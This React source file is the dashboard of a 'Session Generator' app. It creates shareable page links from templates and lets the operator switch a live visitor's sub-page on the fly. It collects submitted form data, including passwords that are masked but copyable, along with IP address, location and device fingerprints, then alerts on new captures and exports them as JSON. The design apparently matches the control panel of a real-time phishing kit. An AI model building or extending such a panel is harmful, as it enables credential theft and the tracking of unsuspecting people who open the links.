import React, { useEffect, useState } from 'react';
import { Card, CardContent, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
import { Button } from '@/components/ui/button';
import { Badge } from '@/components/ui/badge';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { ScrollArea, ScrollBar } from "@/components/ui/scroll-area";
import { toast } from '@/components/ui/sonner';
import { LinkIcon, Copy, Download, X, Plus, Bell, Eye, LogOut, Info, Code } from 'lucide-react';
import { useSessions } from '@/hooks/useSessions';
import { useNavigate } from 'react-router-dom';
import { cn } from '@/lib/utils';
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { useAuth } from '@/contexts/AuthContext';
import { useSessionEntries } from '@/hooks/useSessionEntries';
import SessionDetailView from '@/components/session/SessionDetailView';
import { useMainPages, useSubPages } from '@/hooks/usePageTemplates';

const Dashboard = () => {
  const { user, signOut } = useAuth();
  const { sessions, closeSession, updateSession } = useSessions();
  const navigate = useNavigate();
  const [viewingSessionData, setViewingSessionData] = useState<{ 
    sessionId: string, 
    data: Array<{ 
      timestamp: string; 
      ip_address: string; 
      location: string; 
      form_data: Record<string, string>; 
      device_info?: any;
    }> 
  } | null>(null);
  const [detailViewSessionId, setDetailViewSessionId] = useState<string | null>(null);
  const [showRawData, setShowRawData] = useState(false);

  const { sessionData } = useSessionEntries(viewingSessionData?.sessionId);

  // Get main pages for display using mock data
  const { data: mainPages = [] } = useMainPages();
  const { data: subPages = [] } = useSubPages();

  const getMainPageById = (mainPageId: string) => {
    const mainPage = mainPages.find(mp => mp.id === mainPageId);
    if (mainPage) {
      return {
        ...mainPage,
        subPages: subPages.filter(sp => sp.main_page_id === mainPageId)
      };
    }
    return undefined;
  };
  
  // Show notifications for new data
  useEffect(() => {
    sessions.forEach(session => {
      if (session.has_new_data) {
        toast("New Data Received", {
          description: `New data has been captured for session ${session.id}`,
          icon: <Bell className="h-4 w-4" />
        });
      }
    });
  }, [sessions]);
  
  const getPageTypeName = (mainPageId: string, subPageId: string) => {
    const mainPage = getMainPageById(mainPageId);
    const subPage = mainPage?.subPages?.find(sp => sp.id === subPageId);
    
    return {
      mainName: mainPage?.name || 'Unknown',
      subName: subPage?.name || 'Unknown'
    };
  };

  const handleCopyLink = (link: string) => {
    navigator.clipboard.writeText(link);
    toast.success("Link Copied", {
      description: "Session link has been copied to clipboard."
    });
  };
  
  const handleSwitchSubPage = (sessionId: string, newSubPageId: string) => {
    const session = sessions.find(s => s.id === sessionId);
    if (!session) return;
    
    const mainPage = getMainPageById(session.main_page_id);
    const newSubPage = mainPage?.subPages?.find(sp => sp.id === newSubPageId);
    
    updateSession({ sessionId, updates: { current_sub_page_id: newSubPageId } });
    toast.success("Page Type Changed", {
      description: `Session page has been updated to ${newSubPage?.name || 'Unknown'}.`
    });
  };
  
  const handleCloseSession = (sessionId: string) => {
    closeSession(sessionId);
  };

  const handleSignOut = async () => {
    await signOut();
    navigate('/auth');
  };

  const viewSessionData = (sessionId: string) => {
    setViewingSessionData({
      sessionId: sessionId,
      data: []
    });
    // Reset new data flag
    const session = sessions.find(s => s.id === sessionId);
    if (session?.has_new_data) {
      updateSession({ sessionId, updates: { has_new_data: false } });
    }
  };

  const openDetailView = (sessionId: string) => {
    setDetailViewSessionId(sessionId);
    // Reset new data flag
    const session = sessions.find(s => s.id === sessionId);
    if (session?.has_new_data) {
      updateSession({ sessionId, updates: { has_new_data: false } });
    }
  };

  const formatDate = (dateString: string) => {
    const date = new Date(dateString);
    return new Intl.DateTimeFormat('en-US', {
      month: 'short',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    }).format(date);
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    toast.success("Copied to clipboard");
  };

  const exportSessionData = () => {
    if (!sessionData.length) return;
    
    const dataStr = JSON.stringify(sessionData, null, 2);
    const dataBlob = new Blob([dataStr], { type: 'application/json' });
    const url = URL.createObjectURL(dataBlob);
    const link = document.createElement('a');
    link.href = url;
    link.download = `session-${viewingSessionData?.sessionId}-data.json`;
    link.click();
    URL.revokeObjectURL(url);
  };

  return (
    <div className="container mx-auto animate-fade-in">
      {detailViewSessionId ? (
        <SessionDetailView 
          sessionId={detailViewSessionId} 
          onClose={() => setDetailViewSessionId(null)}
        />
      ) : (
        <>
          <div className="flex flex-col md:flex-row md:justify-between md:items-center gap-4 mb-8">
            <div>
              <h1 className="text-3xl font-bold">Session Generator</h1>
              <p className="text-muted-foreground">Welcome back, {user?.email}</p>
            </div>
            <div className="flex gap-2">
              <Button onClick={() => navigate('/create-session')}>
                <Plus className="h-4 w-4 mr-2" /> Create Session
              </Button>
              <Button variant="outline" onClick={handleSignOut}>
                <LogOut className="h-4 w-4 mr-2" /> Sign Out
              </Button>
            </div>
          </div>
          
          <div className="mb-8">
            <h2 className="text-xl font-semibold mb-4">Current Sessions</h2>
            {sessions.length === 0 ? (
              <div className="bg-card rounded-lg p-8 text-center border">
                <div className="mb-4 text-muted-foreground">
                  <LinkIcon className="h-12 w-12 mx-auto" />
                </div>
                <h3 className="text-lg font-medium mb-2">No active sessions</h3>
                <p className="text-muted-foreground mb-4">Create your first session to get started</p>
                <Button onClick={() => navigate('/create-session')}>Create Session</Button>
              </div>
            ) : (
              <ScrollArea className="w-full whitespace-nowrap rounded-md border">
                <div className="flex p-4 gap-4">
                  {sessions.map((session) => {
                    const mainPage = getMainPageById(session.main_page_id);
                    const currentSubPage = mainPage?.subPages?.find(
                      sp => sp.id === session.current_sub_page_id
                    );
                    const mainName = mainPage?.name || 'Unknown';
                    const subName = currentSubPage?.name || 'Unknown';
                    
                    return (
                      <Card 
                        key={session.id} 
                        className={cn(
                          "session-card min-w-[300px] max-w-[350px]",
                          session.has_new_data && "animate-pulse border-primary"
                        )}
                      >
                        <CardHeader className="pb-3 relative">
                          <Button 
                            variant="ghost" 
                            size="icon" 
                            className="absolute top-2 right-2" 
                            onClick={() => handleCloseSession(session.id)}
                          >
                            <X className="h-4 w-4" />
                          </Button>
                          <div className="pr-6 flex items-center justify-between">
                            <CardTitle className="text-lg">Session: {session.id}</CardTitle>
                            {session.has_new_data && (
                              <Bell className="h-4 w-4 text-primary animate-pulse" />
                            )}
                          </div>
                          <div className="mt-1">
                            <Badge className="mr-2 bg-brand-purple">{mainName}</Badge>
                            <Badge variant="outline">{subName}</Badge>
                          </div>
                          <div className="mt-2 text-sm text-muted-foreground truncate flex items-center">
                            <a 
                              href={`${window.location.origin}/page/${session.id}`} 
                              target="_blank" 
                              rel="noopener noreferrer"
                              className="hover:underline truncate mr-2"
                            >
                              {`${window.location.origin}/page/${session.id}`}
                            </a>
                            <Button 
                              variant="ghost" 
                              size="icon" 
                              className="h-5 w-5" 
                              onClick={() => handleCopyLink(`${window.location.origin}/page/${session.id}`)}
                            >
                              <Copy className="h-3 w-3" />
                            </Button>
                          </div>
                        </CardHeader>
                        <CardContent className="pb-3">
                          <div className="flex items-center justify-between">
                            <div>
                              <div className="text-sm font-medium">Sub Page:</div>
                              <div className="mt-1">
                                <Select 
                                  value={session.current_sub_page_id} 
                                  onValueChange={(value) => handleSwitchSubPage(session.id, value)}
                                >
                                  <SelectTrigger className="w-[130px] h-8 text-xs">
                                    <SelectValue />
                                  </SelectTrigger>
                                  <SelectContent>
                                    {(mainPage?.subPages || []).map((subPage) => (
                                      <SelectItem key={subPage.id} value={subPage.id}>
                                        {subPage.name}
                                      </SelectItem>
                                    ))}
                                  </SelectContent>
                                </Select>
                              </div>
                            </div>
                          </div>
                        </CardContent>
                        <CardFooter className="pt-2 flex justify-between">
                          <Button
                            variant="outline"
                            size="sm"
                            onClick={() => viewSessionData(session.id)}
                            className={cn(
                              session.has_new_data && "animate-pulse border-primary text-primary"
                            )}
                          >
                            <Eye className={cn(
                              "h-4 w-4 mr-2",
                              session.has_new_data && "text-primary animate-pulse"
                            )} /> 
                            View Data
                          </Button>
                          <Button
                            variant="outline"
                            size="sm"
                            onClick={() => openDetailView(session.id)}
                          >
                            <Info className="h-4 w-4 mr-2" />
                            Details
                          </Button>
                        </CardFooter>
                      </Card>
                    );
                  })}
                </div>
                <ScrollBar orientation="horizontal" />
              </ScrollArea>
            )}
          </div>
          
          <div className="bg-card rounded-lg p-6 border">
            <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-4">
              <div>
                <h3 className="text-lg font-medium">Session Quick Guide</h3>
                <p className="text-muted-foreground max-w-2xl">
                  Create a session, share the generated link, and collect data. You can change the sub-page at any time
                  and the live session will update instantly.
                </p>
              </div>
              <Button variant="outline" className="shrink-0" onClick={() => navigate('/create-session')}>
                <Plus className="h-4 w-4 mr-2" /> Create New Session
              </Button>
            </div>
          </div>

          {/* Enhanced Data Viewing Dialog */}
          <Dialog open={!!viewingSessionData} onOpenChange={() => setViewingSessionData(null)}>
            <DialogContent className="max-w-4xl max-h-[80vh] overflow-y-auto">
              <DialogHeader>
                <div className="flex items-center justify-between">
                  <DialogTitle>Session Data: {viewingSessionData?.sessionId}</DialogTitle>
                  <div className="flex gap-2">
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={() => setShowRawData(!showRawData)}
                    >
                      <Code className="h-4 w-4 mr-2" />
                      {showRawData ? 'Formatted' : 'Raw JSON'}
                    </Button>
                    <Button
                      variant="outline"
                      size="sm"
                      onClick={exportSessionData}
                      disabled={!sessionData.length}
                    >
                      <Download className="h-4 w-4 mr-2" />
                      Export
                    </Button>
                  </div>
                </div>
              </DialogHeader>
              {sessionData.length === 0 ? (
                <div className="text-center py-8">
                  <p>No data has been captured for this session yet.</p>
                </div>
              ) : showRawData ? (
                <div className="space-y-4">
                  <pre className="bg-gray-50 p-4 rounded-lg text-xs overflow-auto max-h-96 border">
                    <code>{JSON.stringify(sessionData, null, 2)}</code>
                  </pre>
                  <Button
                    variant="outline"
                    size="sm"
                    onClick={() => copyToClipboard(JSON.stringify(sessionData, null, 2))}
                  >
                    <Copy className="h-4 w-4 mr-2" />
                    Copy Raw Data
                  </Button>
                </div>
              ) : (
                <div className="space-y-6">
                  {sessionData.map((entry, index) => (
                    <Card key={index} className="border">
                      <CardHeader className="pb-2">
                        <div className="flex justify-between items-center">
                          <div className="text-sm text-muted-foreground">
                            Entry #{index + 1} • {new Date(entry.timestamp).toLocaleString()}
                          </div>
                          <div className="flex gap-2">
                            <Badge variant="outline" className="text-xs">
                              {entry.location}
                            </Badge>
                            {entry.ip_address && (
                              <Badge variant="secondary" className="text-xs">
                                {entry.ip_address}
                              </Badge>
                            )}
                          </div>
                        </div>
                      </CardHeader>
                      <CardContent>
                        <div className="space-y-4">
                          <div>
                            <h4 className="font-medium mb-2">Form Data</h4>
                            <div className="space-y-2">
                              {Object.entries(entry.form_data || {}).map(([key, value]) => (
                                <div key={key} className="grid grid-cols-12 gap-2 items-center">
                                  <div className="col-span-4 font-medium text-sm">{key}:</div>
                                  <div className="col-span-7 text-sm truncate">
                                    {key.includes('password') ? '••••••••' : String(value)}
                                  </div>
                                  <div className="col-span-1 flex justify-end">
                                    <Button 
                                      variant="ghost" 
                                      size="icon" 
                                      className="h-6 w-6" 
                                      onClick={() => copyToClipboard(String(value))}
                                    >
                                      <Copy className="h-3.5 w-3.5" />
                                    </Button>
                                  </div>
                                </div>
                              ))}
                            </div>
                          </div>
                          
                          {entry.device_info && (
                            <div>
                              <h4 className="font-medium mb-2">Device Information</h4>
                              <div className="text-xs text-muted-foreground space-y-1">
                                <div>Browser: {entry.device_info.userAgent}</div>
                                <div>Platform: {entry.device_info.platform}</div>
                                <div>Language: {entry.device_info.language}</div>
                                <div>Screen: {entry.device_info.screen?.width}x{entry.device_info.screen?.height}</div>
                                <div>Viewport: {entry.device_info.viewport?.width}x{entry.device_info.viewport?.height}</div>
                                <div>Timezone: {entry.device_info.timezone}</div>
                              </div>
                            </div>
                          )}
                        </div>
                      </CardContent>
                    </Card>
                  ))}
                </div>
              )}
            </DialogContent>
          </Dialog>
        </>
      )}
    </div>
  );
};

export default Dashboard;
